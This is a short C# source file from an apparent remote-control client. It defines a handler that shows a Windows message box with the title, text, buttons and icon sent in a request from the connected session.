using System;
using System.Threading;
using System.Windows.Forms;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Request;

namespace RemoteControl.Client.Handlers
{
    class RequestMsgBoxHandler : AbstractRequestHandler
    {
        public override void Handle(SocketSession session, ePacketType reqType, object reqObj)
        {
            var req = reqObj as RequestMessageBox;
            if (req == null) return;

            RunTaskThread(() =>
            {
                try
                {
                    MessageBoxButtons buttons = (MessageBoxButtons)req.MessageBoxButtons;
                    MessageBoxIcon icon = (MessageBoxIcon)req.MessageBoxIcons;
                    Thread uiThread = new Thread(() =>
                    {
                        MessageBox.Show(req.Content, req.Title, buttons, icon);
                    });
                    uiThread.SetApartmentState(ApartmentState.STA);
                    uiThread.Start();
                }
                catch (Exception ex)
                {
                    DoOutput("消息弹窗异常: " + ex.Message);
                }
            });
        }
    }
}
